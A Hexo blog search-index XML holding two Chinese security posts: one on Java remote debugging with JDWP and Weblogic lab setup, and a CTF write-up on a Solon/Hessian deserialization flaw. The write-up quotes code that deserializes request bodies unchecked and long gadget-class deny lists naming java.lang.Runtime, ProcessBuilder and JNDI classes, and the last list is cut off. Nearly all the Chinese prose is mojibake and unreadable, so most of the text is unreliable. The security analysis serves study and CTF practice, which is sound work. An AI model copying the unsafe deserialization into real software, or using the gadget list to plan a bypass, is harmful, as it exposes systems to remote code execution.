<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Javaè¿œç¨‹è°ƒè¯•</title>
      <link href="/2025/02/07/Java%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/"/>
      <url>/2025/02/07/Java%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘æƒ³çœ‹çœ‹weblogicï¼Œä½†æ˜¯ç¯å¢ƒæ¯”è¾ƒéš¾æ­å»ºå’Œè°ƒè¯•ï¼Œè¶ç€è¿™ä¸ªæœºä¼šï¼Œçœ‹ä¸€ä¸‹javaçš„å„ç§ä»£ç è¿œç¨‹è°ƒè¯•çš„æ–¹æ³•ï¼Œå¾ˆåŸºç¡€çš„ä¸œè¥¿äº†ï¼Œä¸€ç›´æ²¡çœ‹ã€‚(é¡ºä¾¿æ°´ä¸€ç¯‡åšå®¢)</p><h1 id="è¿œç¨‹è°ƒè¯•jaråŒ…"><a href="#è¿œç¨‹è°ƒè¯•JaråŒ…" class="headerlink" title="è¿œç¨‹è°ƒè¯•JaråŒ…"></a>è¿œç¨‹è°ƒè¯•JaråŒ…</h1><p>ä¸»è¦åœ¨åªæœ‰jaråŒ…æ— æºç çš„æƒ…å†µä¸‹è¿›è¡Œè°ƒè¯•ã€‚</p><p>è¿™é‡Œä»¥å†°èçš„jaråŒ…ä¸ºä¾‹å­</p><p>éšä¾¿å¼€ä¸€ä¸ªjavaé¡¹ç›®ï¼Œç„¶åæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªlibç›®å½•ç„¶åæ”¾å…¥jaråŒ…</p><p><img src="https://cdn.clown2024.cn/image-20250207232603675.png" alt="image-20250207232603675"></p><p>å³é”®é€‰æ‹©Add as Libraryï¼Œå°†libæ–‡ä»¶å¤¹æ·»åŠ è¿›é¡¹ç›®ä¾èµ–</p><p><img src="https://cdn.clown2024.cn/image-20250207232743226.png" alt="image-20250207232743226"></p><p>ç„¶åå°±å¯ä»¥çœ‹åˆ°jaråŒ…ä¸­åç¼–è¯‘çš„æºä»£ç äº†</p><p><img src="https://cdn.clown2024.cn/image-20250207232819108.png" alt="image-20250207232819108"></p><p>ç„¶åæˆ‘ä»¬æ·»åŠ ä¸€ä¸ªRemote JVM Debugçš„Configuration</p><p><img src="https://cdn.clown2024.cn/image-20250207233704447.png" alt="image-20250207233704447"></p><p>ç„¶åé»˜è®¤é…ç½®Applyæäº¤å¹¶ä¿å­˜å³å¯ï¼Œå…¶ä¸­<code>-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005</code>å°†ä½œä¸ºè¿è¡Œæ—¶çš„å¯åŠ¨å‚æ•°</p><p><img src="https://cdn.clown2024.cn/image-20250207233914498.png" alt="image-20250207233914498"></p><p>ç„¶åå°†<code>-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005</code>ä½œä¸ºå¯åŠ¨å‚æ•°è¿è¡ŒjaråŒ…</p><p><img src="https://cdn.clown2024.cn/image-20250207234243331.png" alt="image-20250207234243331"></p><blockquote><p>suspendè¡¨ç¤ºæ˜¯å¦æš‚åœç¨‹åºç­‰å¾…è°ƒè¯•å™¨è¿æ¥ï¼Œâ€yâ€è¡¨ç¤ºæš‚åœï¼Œâ€nâ€è¡¨ç¤ºä¸æš‚åœï¼Œè¿™é‡Œè¿˜æ˜¯è¦é€‰æ‹©æš‚åœï¼Œä¸Šé¢é»˜è®¤çš„æ˜¯ä¸æš‚åœå¯¼è‡´æˆ‘è°ƒè¯•è¿›å…¥ä¸åˆ°æ–­ç‚¹ï¼Œå› ä¸ºå®¹æ˜“ç¨‹åºæ‰§è¡Œè¿‡å¿«æ–­ç‚¹æ‹¦æˆªä¸åˆ°</p></blockquote><p>å‘ƒå‘ƒä½†æ˜¯è¿˜æ˜¯ä¸æˆåŠŸï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œåæ¥æ‰¾åˆ°ä¸€ç¯‡çœ‹é›ªçš„æ–‡ç« ï¼š<a href="https://bbs.kanxue.com/thread-282397.htm%EF%BC%8C%E8%AF%B4%E6%98%AF%E7%AC%A6%E5%8F%B7%E8%A1%A8%E7%9A%84%E5%8E%9F%E5%9B%A0%EF%BC%8C%E5%9B%A0%E4%B8%BA%E5%9C%A8%E7%BC%96%E8%AF%91%E7%9A%84%E6%97%B6%E5%80%99%E5%8E%BB%E6%8E%89%E4%BA%86%E8%B0%83%E8%AF%95%E7%AC%A6%E5%8F%B7%EF%BC%8C%E5%9C%A8%E6%B2%A1%E6%9C%89%E7%AC%A6%E5%8F%B7%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%EF%BC%8C%E5%AF%B9%E4%B8%9A%E5%8A%A1%E4%BB%A3%E7%A0%81%E5%87%BD%E6%95%B0%E4%BD%93%E5%86%85%E7%9A%84%E5%9C%B0%E6%96%B9%E4%B8%8B%E6%96%AD%E7%82%B9%E5%A4%B1%E6%95%88%EF%BC%8C%E5%8F%AA%E6%9C%89%E5%AF%B9%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0%E7%9A%84%E4%BB%A3%E7%A0%81%E4%B8%8B%E6%96%AD%E7%82%B9%E6%98%AF%E5%8F%AF%E4%BB%A5%E7%9A%84%E3%80%82">https://bbs.kanxue.com/thread-282397.htmï¼Œè¯´æ˜¯ç¬¦å·è¡¨çš„åŸå› ï¼Œå› ä¸ºåœ¨ç¼–è¯‘çš„æ—¶å€™å»æ‰äº†è°ƒè¯•ç¬¦å·ï¼Œåœ¨æ²¡æœ‰ç¬¦å·çš„æƒ…å†µä¸‹ï¼Œå¯¹ä¸šåŠ¡ä»£ç å‡½æ•°ä½“å†…çš„åœ°æ–¹ä¸‹æ–­ç‚¹å¤±æ•ˆï¼Œåªæœ‰å¯¹ç³»ç»Ÿå‡½æ•°çš„ä»£ç ä¸‹æ–­ç‚¹æ˜¯å¯ä»¥çš„ã€‚</a></p><p>é‚£è¿™é‡Œå†é‡æ–°å†™ä¸€ä¸ªç®€å•çš„å¾ªç¯æ‰“å°çš„demoæ¥è¯•ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20250209164358801.png" alt="image-20250209164358801"></p><p><strong>å»æ‰è°ƒè¯•ç¬¦å·</strong></p><p>è¦å»æ‰è°ƒè¯•ç¬¦å·çš„è¯ç¼–è¯‘æ—¶åŠ ä¸Š<code>-g:none</code>å³å¯</p><h2 id="jaræ‰“åŒ…"><a href="#jaræ‰“åŒ…" class="headerlink" title="jaræ‰“åŒ…"></a>jaræ‰“åŒ…</h2><p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå°æ’æ›²ï¼Œæˆ‘ä¸€å¼€å§‹æ‰“åŒ…å®Œä¹‹åè¿è¡Œä¼šè¯´æ²¡æœ‰ä¸»å±æ€§æ¸…å•ï¼Œæˆ‘ä¸€çœ‹mfæ–‡ä»¶ï¼Œæ ¹æœ¬æ²¡æœ‰æŒ‡å®šMain-Classï¼Œç„¶åè¿™é‡Œéœ€è¦ç”¨åˆ°ä¸€ä¸ªæ‰“åŒ…æ’ä»¶æ¥ç”Ÿæˆï¼Œè®°å½•ä¸€ä¸‹</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">finalName</span>&gt;</span>$&#123;project.artifactId&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">finalName</span>&gt;</span><span class="hljs-comment">&lt;!--ä¿®æ”¹ç¼–è¯‘å‡ºæ¥çš„jaråŒ…åï¼Œä»…ä¸º&#123;artifactId&#125;.jar--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-jar-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">archive</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">manifest</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">addClasspath</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">addClasspath</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">mainClass</span>&gt;</span>org.clown.Main<span class="hljs-tag">&lt;/<span class="hljs-name">mainClass</span>&gt;</span> <span class="hljs-comment">&lt;!-- æ­¤å¤„ä¸ºä¸»å…¥å£--&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">archive</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç„¶åå†æ‰“åŒ…å°±è¡Œäº†</p><p>ç„¶åå†æŒ‰å‰é¢çš„æ–¹å¼å¯åŠ¨å°±å¯ä»¥æ‰“åˆ°æ–­ç‚¹äº†</p><p><img src="https://cdn.clown2024.cn/image-20250209165226194.png" alt="image-20250209165226194"></p><p>é‚£çœ‹æ¥å‰é¢å¤±è´¥çš„åŸå› å°±æ˜¯å› ä¸ºæ²¡æœ‰ç¬¦å·è¡¨çš„é—®é¢˜äº†</p><p>ç„¶åå‰é¢ä¸šåŠ¡ä»£ç æ–­ä¸äº†ç‚¹ï¼Œä½†æ˜¯å¯ä»¥åœ¨å‡½æ•°åçš„åœ°æ–¹æ–­ç‚¹ï¼Œè¿™é‡Œéšä¾¿æ‹¿äº†ä¸€ä¸ªç®€å•çš„webåº”ç”¨æ¥å°è¯•</p><p><img src="https://cdn.clown2024.cn/image-20250209165724961.png" alt="image-20250209165724961"></p><p>ç„¶åä»–å°±ä¼šè¿›åˆ°ç³»ç»Ÿå‡½æ•°é‡Œé¢äº†ï¼Œæ‰€ä»¥æ²¡æœ‰æºç è¿˜æ˜¯æ¯”è¾ƒä¸æ–¹ä¾¿</p><h1 id="æœ‰æºç çš„æƒ…å†µä¸‹è¿œç¨‹è°ƒè¯•"><a href="#æœ‰æºç çš„æƒ…å†µä¸‹è¿œç¨‹è°ƒè¯•" class="headerlink" title="æœ‰æºç çš„æƒ…å†µä¸‹è¿œç¨‹è°ƒè¯•"></a>æœ‰æºç çš„æƒ…å†µä¸‹è¿œç¨‹è°ƒè¯•</h1><p>æ“ä½œå’Œå‰é¢çš„ä¸€æ ·ï¼ŒåŒºåˆ«å°±æ˜¯æœ¬åœ°ç”¨çš„æ˜¯æºç ã€‚</p><p>æ€»ä¹‹æœ‰æºç å°½é‡ç”¨æºç è°ƒè¯•ã€‚</p><h1 id="è¿œç¨‹è°ƒè¯•docker"><a href="#è¿œç¨‹è°ƒè¯•Docker" class="headerlink" title="è¿œç¨‹è°ƒè¯•Docker"></a>è¿œç¨‹è°ƒè¯•Docker</h1><p>è¿™é‡Œå¯ä»¥çœ‹çœ‹pç¥çš„è§†é¢‘ï¼š<a href="https://www.bilibili.com/video/BV1bb421n7M2/?vd_source=f056182291458f597ae69cee19ecf116">https://www.bilibili.com/video/BV1bb421n7M2/?vd_source=f056182291458f597ae69cee19ecf116</a></p><p>å…¶å®åŸç†ä¹Ÿä¸€æ ·ï¼Œåªè¦æ˜ å°„ç«¯å£å‡ºæ¥ï¼Œç„¶åæœ¬åœ°æ”¾ä¸€ä¸ªç‰ˆæœ¬ä¸€æ ·çš„jaråŒ…æˆ–è€…æºç å³å¯ï¼Œå°±ä¸å†è®°å½•äº†ã€‚</p><h1 id="weblogicç¯å¢ƒæ­å»º"><a href="#Weblogicç¯å¢ƒæ­å»º" class="headerlink" title="Weblogicç¯å¢ƒæ­å»º"></a>Weblogicç¯å¢ƒæ­å»º</h1><p>å› ä¸ºå‡†å¤‡çœ‹Weblogicï¼Œæ‰€ä»¥ç¯å¢ƒæ­å»ºä¹Ÿåœ¨è¿™é‡Œå†™äº†å§</p><p>è¿™é‡Œæ¨èè¿™ä¸ªç¯å¢ƒæ­å»ºå·¥å…·ï¼š<a href="https://github.com/QAX-A-Team/WeblogicEnvironment">https://github.com/QAX-A-Team/WeblogicEnvironment</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BookManagerå¤ç°</title>
      <link href="/2025/01/10/BookManager%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/01/10/BookManager%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å½“æ—¶ciscn&amp;é•¿åŸæ¯åœºä¸Šçš„ä¸€é¢˜é›¶è§£é¢˜ï¼Œå½“æ—¶åç¼–è¯‘çœ‹äº†ä¸€ä¸‹è¿™é¢˜çš„æºç ï¼Œå‘ç°æ˜¯å¾®æœåŠ¡å½¢å¼çš„ï¼Œæœ‰ä¸ªApiGatewayï¼Œç„¶åçœ‹äº†åŠå¤©ä¹Ÿæ‰¾ä¸åˆ°ååºåˆ—åŒ–çš„ç‚¹ï¼Œç”šè‡³è¿è¯·æ±‚å“ªä¸ªè·¯ç”±éƒ½ä¸æ¸…æ¥šğŸ¥²ç„¶åç”¨çš„åˆæ˜¯solonè¿™ä¸ªæ¡†æ¶ä¸ç†Ÿæ‚‰ï¼Œç›´æ¥å¼€æ‘†äº†</p><p>åæ¥çœ‹åˆ°æœ‰å¸ˆå‚…è§£å‡ºæ¥äº†ï¼Œé‚æ¥å¤ç°ä¸€ä¸‹</p><h1 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h1><p>çœ‹äº†ä¸€ä¸‹æ‰å‘ç°ç½‘å…³è¿™é‡Œé™åˆ¶äº†æˆ‘ä»¬çš„è·¯ç”±å‰ç¼€(æ²¡å­¦è¿‡ä¸å¤ªæ‡‚ğŸ˜­ï¼Œæ€ªä¸å¾—ç›´æ¥getAllBooksä»€ä¹ˆéƒ½æ²¡æœ‰</p><p><img src="https://cdn.clown2024.cn/image-20250112172824168.png" alt="image-20250112172824168"></p><p>ç›´æ¥é—®deepseekçš„è§£é‡Šå¦‚ä¸‹ï¼š</p><blockquote><p>è¿™æ®µä»£ç å®ç°äº†ä¸€ä¸ª API ç½‘å…³ï¼Œä¸»è¦åŠŸèƒ½åŒ…æ‹¬ï¼š</p><ol><li><strong>è·¯ç”±åŒ¹é…</strong>ï¼š<ul><li>æ‰€æœ‰ä»¥ <code>/api/rest/</code> å¼€å¤´çš„è¯·æ±‚éƒ½ä¼šè¢«è¯¥ç½‘å…³å¤„ç†ã€‚</li><li>ä¾‹å¦‚ï¼Œ<code>/api/rest/book</code> ä¼šè¢«æ˜ å°„åˆ° <code>BookServiceImpl</code> ç±»ã€‚</li></ul></li><li><strong>å‰ç½®é€»è¾‘</strong>ï¼š<ul><li>åœ¨è¯·æ±‚å¤„ç†ä¹‹å‰ï¼Œè®¾ç½®é»˜è®¤çš„å“åº”æ¸²æŸ“æ ¼å¼ä¸º JSONã€‚</li></ul></li><li><strong>æœåŠ¡æ³¨å†Œ</strong>ï¼š<ul><li>å°† <code>BookServiceImpl</code> ç±»æ³¨å†Œä¸ºå¤„ç† <code>/api/rest/book</code> è·¯å¾„çš„æœåŠ¡ã€‚</li></ul></li></ol></blockquote><p><img src="https://cdn.clown2024.cn/image-20250110225521551.png" alt="image-20250110225521551"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ç”¨çš„æ˜¯solonçš„2.5.12çš„ç‰ˆæœ¬ï¼Œå½“æ—¶ç›´æ¥æœæ˜¯æ²¡æœ‰æœåˆ°è¯¥ç‰ˆæœ¬çš„æ¼æ´çš„ï¼Œä¸€æœååºåˆ—åŒ–åŸºæœ¬éƒ½æ˜¯2.5.11çš„</p><p><img src="https://cdn.clown2024.cn/image-20250110225852926.png" alt="image-20250110225852926"></p><p>ç„¶åè¿™ä½è€å“¥æ˜¯ä»githubçš„issueç¿»åˆ°ç›¸å…³çš„ä¿¡æ¯ï¼Œå˜¶æˆ‘çªç„¶æƒ³åˆ°æˆ‘å¯ä»¥ç”¨è‹±æ–‡æœä¸€æœè¯•è¯•ï¼Œè¢«ä¸­æ–‡é™åˆ¶äº†ï¼Œæ€ªä¸å¾—æˆ‘æ¯æ¬¡éƒ½æ‰¾ä¸åˆ°expğŸ˜­</p><p><img src="https://cdn.clown2024.cn/image-20250110230600436.png" alt="image-20250110230600436"></p><p>æœç„¶æ¢è‹±æ–‡å°±èƒ½æœåˆ°å¾ˆå¤šä¸œè¥¿äº†ï¼Œå¯ä»¥ç›´æ¥å»å¯¹åº”çš„issueçœ‹ä¸€çœ‹ï¼š<a href="https://github.com/opensolon/solon/issues/226%EF%BC%8C%E8%BF%99%E4%B8%AAissue%E6%98%AF%E7%94%A8Fury%E7%BB%84%E4%BB%B6%E7%9A%84RPC%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%BC%8F%E6%B4%9E">https://github.com/opensolon/solon/issues/226ï¼Œè¿™ä¸ªissueæ˜¯ç”¨Furyç»„ä»¶çš„RPCåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ¼æ´</a></p><p><img src="https://cdn.clown2024.cn/image-20250110231433766.png" alt="image-20250110231433766"></p><p>ä½†æ˜¯é¢˜ç›®ç»™çš„è¿™ä¸ªç‰ˆæœ¬ä¸ºå•¥å‹æ ¹å°±æ²¡è¿™ä¸œè¥¿ã€‚ã€‚ã€‚</p><p><img src="https://cdn.clown2024.cn/image-20250110231514440.png" alt="image-20250110231514440"></p><p>ç„¶åè€å“¥æ˜¯æ‰¾çš„å†å¾€å‰çš„ä¸€ä¸ªRCEçš„issueï¼š<a href="https://github.com/opensolon/solon/issues/73">https://github.com/opensolon/solon/issues/73</a></p><p>è¯¥issueçš„æ¼æ´æ˜¯ä¸€ä¸ªHessianååºåˆ—åŒ–ï¼Œåœ¨<strong>org&#x2F;noear&#x2F;solon&#x2F;serialization&#x2F;hessian&#x2F;HessianActionExecutor.java</strong>è¿™ä¸ªç±»é‡Œé¢çš„æ¼æ´ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">changeBody</span><span class="hljs-params">(Context ctx)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hi</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(ctx.bodyAsBytes()));<br>    <span class="hljs-keyword">return</span> hi.readObject();<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250110232003916.png" alt="image-20250110232003916"></p><p>æ‰€ä»¥å¦‚æœContent-Type ä¸º <code>application/hessian</code> ï¼Œåˆ™å‘é€åˆ°å«å‚ RESTful API çš„ Request ä¸­çš„ Body éƒ¨åˆ†ä¼šè¢« Hessian è¿›è¡Œååºåˆ—åŒ–ï¼Œä½†æ˜¯é¢˜ç›®è¿™é‡Œæ˜¯æ‰‹åŠ¨åŠ äº†ä¸€ä¸ªtestedæ–¹æ³•æ¥è¿‡æ»¤</p><p>é¡ºä¾¿çœ‹äº†ä¸€ä¸‹åŸä½œè€…çš„ä¿®å¤ï¼Œæ˜¯å°†å¯¹hessiançš„ä¾èµ–æ”¹æˆsofa-hessianï¼Œè¯¥ç‰ˆæœ¬ç”¨çš„ä¹Ÿæ˜¯sofa-hessianï¼Œæœ‰è¶£çš„æ˜¯åé¢åˆæœ‰issueæŠŠsofa-hessianç»™ç»•äº†ï¼š<a href="https://github.com/opensolon/solon/issues/145">https://github.com/opensolon/solon/issues/145</a></p><h2 id="wafç»•è¿‡"><a href="#wafç»•è¿‡" class="headerlink" title="wafç»•è¿‡"></a>wafç»•è¿‡</h2><p>çœ‹ä¸€ä¸‹ä»–çš„è¿‡æ»¤æ–¹æ³•ï¼Œsofa-hessianæœ¬èº«å°±æ˜¯åˆ©ç”¨äº†é»‘åå•çš„æ–¹å¼ï¼Œé‡Œé¢åœ¨hessianååºåˆ—åŒ–çš„è¿‡ç¨‹è¿›è¡Œäº†patch</p><p>åœ¨com.alibaba.com.caucho.hessian.io&#x2F;ClassFactoryé‡Œé¢ï¼Œemmmä½†æ˜¯è¯´å®è¯è¿™é‡ŒæŒºå¥‡æ€ªçš„ï¼Œæˆ‘æœ¬åœ°ä¸‹äº†sofa-hessianä»–æ˜¯å¹¶æ²¡æœ‰è¿™ä¸ªClassFactoryçš„ï¼Œåè€Œæ˜¯åœ¨æ­£å¸¸çš„hessiané‡Œé¢çš„ï¼Œsofa-hessiançš„é»‘åå•æ˜¯å¦ä¸€ç§æ–¹å¼çš„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">static &#123;<br>        _staticAllowList = new ArrayList&lt;Allow&gt;();<br><br>        ClassLoader classLoader = ClassFactory.class.getClassLoader();<br>        List&lt;String&gt; stringList = new ArrayList&lt;&gt;();<br>        for (byte[] bytes : byteArray) &#123;<br>            stringList.add(new String(bytes));<br>        &#125;<br>        String[] denyClasses = stringList.toArray(new String[0]);<br>        for (String denyClass : denyClasses) &#123;<br>            if (denyClass.startsWith(&quot;#&quot;)) &#123;<br>                continue;<br>            &#125;<br>            if (denyClass.endsWith(&quot;.&quot;)) &#123;<br>                _staticAllowList.add(new AllowPrefix(denyClass, false));<br>            &#125; else &#123;<br>                _staticAllowList.add(new Allow(toPattern(denyClass), false));<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>é»‘åå•å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">bsh.<br>ch.qos.logback.core.db.<br>clojure.<br>com.alibaba.citrus.springext.support.parser.<br>com.alibaba.citrus.springext.util.SpringExtUtil.<br>com.alibaba.druid.pool.<br>com.alibaba.hotcode.internal.org.apache.commons.collections.functors.<br>com.alipay.custrelation.service.model.redress.<br>com.alipay.oceanbase.obproxy.druid.pool.<br>com.caucho.config.types.<br>com.caucho.hessian.test.<br>com.caucho.naming.<br>com.ibm.jtc.jax.xml.bind.v2.runtime.unmarshaller.<br>com.ibm.xltxe.rnm1.xtq.bcel.util.<br>com.mchange.v2.c3p0.<br>com.mysql.jdbc.util.<br>com.rometools.rome.feed.<br>com.sun.corba.se.impl.<br>com.sun.corba.se.spi.orbutil.<br>com.sun.jndi.rmi.<br>com.sun.jndi.toolkit.<br>com.sun.org.apache.bcel.internal.<br>com.sun.org.apache.xalan.internal.<br>com.sun.rowset.<br>com.sun.xml.internal.bind.v2.<br>com.taobao.vipserver.commons.collections.functors.<br>groovy.lang.<br>java.awt.<br>java.beans.<br>java.lang.ProcessBuilder<br>java.lang.Runtime<br>java.rmi.server.<br>java.security.<br>java.util.ServiceLoader<br>java.util.StringTokenizer<br>javassist.bytecode.annotation.<br>javassist.tools.web.Viewer<br>javassist.util.proxy.<br>javax.imageio.<br>javax.imageio.spi.<br>javax.management.<br>javax.media.jai.remote.<br>javax.naming.<br>javax.script.<br>javax.sound.sampled.<br>javax.swing.<br>javax.xml.transform.<br>net.bytebuddy.dynamic.loading.<br>oracle.jdbc.connector.<br>oracle.jdbc.pool.<br>org.apache.aries.transaction.jms.<br>org.apache.bcel.util.<br>org.apache.carbondata.core.scan.expression.<br>org.apache.commons.beanutils.<br>org.apache.commons.codec.binary.<br>org.apache.commons.collections.functors.<br>org.apache.commons.collections4.functors.<br>org.apache.commons.configuration.<br>org.apache.commons.configuration2.<br>org.apache.commons.dbcp.datasources.<br>org.apache.commons.dbcp2.datasources.<br>org.apache.commons.fileupload.disk.<br>org.apache.ibatis.executor.loader.<br>org.apache.ibatis.javassist.bytecode.<br>org.apache.ibatis.javassist.tools.<br>org.apache.ibatis.javassist.util.<br>org.apache.ignite.cache.<br>org.apache.log.output.db.<br>org.apache.log4j.receivers.db.<br>org.apache.myfaces.view.facelets.el.<br>org.apache.openjpa.ee.<br>org.apache.openjpa.ee.<br>org.apache.shiro.<br>org.apache.tomcat.dbcp.<br>org.apache.velocity.runtime.<br>org.apache.velocity.<br>org.apache.wicket.util.<br>org.apache.xalan.xsltc.trax.<br>org.apache.xbean.naming.context.<br>org.apache.xpath.<br>org.apache.zookeeper.<br>org.aspectj.apache.bcel.util.<br>org.codehaus.groovy.runtime.<br>org.datanucleus.store.rdbms.datasource.dbcp.datasources.<br>org.eclipse.jetty.util.log.<br>org.geotools.filter.<br>org.h2.value.<br>org.hibernate.tuple.component.<br>org.hibernate.type.<br>org.jboss.ejb3.<br>org.jboss.proxy.ejb.<br>org.jboss.resteasy.plugins.server.resourcefactory.<br>org.jboss.weld.interceptor.builder.<br>org.mockito.internal.creation.cglib.<br>org.mortbay.log.<br>org.quartz.<br>org.springframework.aop.aspectj.<br>org.springframework.beans.BeanWrapperImpl$BeanPropertyHandler<br>org.springframework.beans.factory.<br>org.springframework.expression.spel.<br>org.springframework.jndi.<br>org.springframework.orm.<br>org.springframework.transaction.<br>org.yaml.snakeyaml.tokens.<br>pstore.shaded.org.apache.commons.collections.<br>sun.rmi.server.<br>sun.rmi.transport.<br>weblogic.ejb20.internal.<br>weblogic.jms.common.<br></code></pre></td></tr></table></figure><p>ç„¶åé¢˜ç›®è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªè‡ªå·±çš„é»‘åå•</p><p><img src="https://cdn.clown2024.cn/image-20250110234707451.png" alt="image-20250110234707451"></p><p>testCaseså°±ç”¨äºŒç»´æ•°ç»„å­˜æ”¾è¿‡æ»¤çš„ç±»ï¼Œè¿‡æ»¤çš„ç±»å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">bsh.<br>ch.qos.logback.core.db.<br>clojure.<br>com.alibaba.citrus.springext.support.parser.<br>com.alibaba.citrus.springext.util.SpringExtUtil.<br>com.alibaba.druid.pool.<br>com.alibaba.hotcode.internal.org.apache.commons.collections.functors.<br>com.alipay.custrelation.service.model.redress.<br>com.alipay.oceanbase.obproxy.druid.pool.<br>com.caucho.config.types.<br>com.caucho.hessian.test.<br>com.caucho.naming.<br>com.ibm.jtc.jax.xml.bind.v2.runtime.unmarshaller.<br>com.ibm.xltxe.rnm1.xtq.bcel.util.<br>com.mchange.v2.c3p0.<br>com.mysql.jdbc.util.<br>com.rometools.rome.feed.<br>com.sun.corba.se.impl.<br>com.sun.corba.se.spi.orbutil.<br>com.sun.jndi.rmi.<br>com.sun.jndi.toolkit.<br>com.sun.org.apache.bcel.internal.<br>com.sun.org.apache.xalan.internal.<br>com.sun.rowset.<br>com.sun.xml.internal.bind.v2.<br>com.taobao.vipserver.commons.collections.functors.<br>groovy.lang.<br>java.awt.<br>java.beans.<br>java.lang.ProcessBuilder<br>java.lang.Runtime<br>java.rmi.server.<br>java.security.<br>java.util.ServiceLoader<br>java.util.StringTokenizer<br>javassist.bytecode.annotation.<br>javassist.tools.web.Viewer<br>javassist.util.proxy.<br>javax.imageio.<br>javax.imageio.spi.<br>javax.management.<br>javax.media.jai.remote.<br>javax.naming.<br>javax.script.<br>javax.sound.sampled.<br>javax.swing.<br>javax.xml.transform.<br>net.bytebuddy.dynamic.loading.<br>oracle.jdbc.connector.<br>oracle.jdbc.pool.<br>org.apache.aries.transaction.jms.<br>org.apache.bcel.util.<br>org.apache.carbondata.core.scan.expression.<br>org.apache.commons.beanutils.<br>org.apache.commons.codec.binary.<br>org.apache.commons.collections.functors.<br>org.apache.commons.collections4.functors.<br>org.apache.commons.codec.<br>org.apache.commons.configuration.<br>org.apache.commons.configuration2.<br>org.apache.commons.dbcp.datasources.<br>org.apache.commons.dbcp2.datasources.<br>org.apache.commons.fileupload.disk.<br>org.apache.ibatis.executor.loader.<br>org.apache.ibatis.javassist.bytecode.<br>org.apache.ibatis.javassist.tools.<br>org.apache.ibatis.javassist.util.<br>org.apache.ignite.cache.<br>org.apache.log.output.db.<br>org.apache.log4j.receivers.db.<br>org.apache.myfaces.view.facelets.el.<br>org.apache.openjpa.ee.<br>org.apache.openjpa.ee.<br>org.apache.shiro.<br>org.apache.tomcat.dbcp.<br>org.apache.velocity.runtime.<br>org.apache.velocity.<br>org.apache.wicket.util.<br>org.apache.xalan.xsltc.trax.<br>org.apache.xbean.naming.context.<br>org.apache.xpath.<br>org.apache.zookeeper.<br>org.aspectj.<br>org.codeh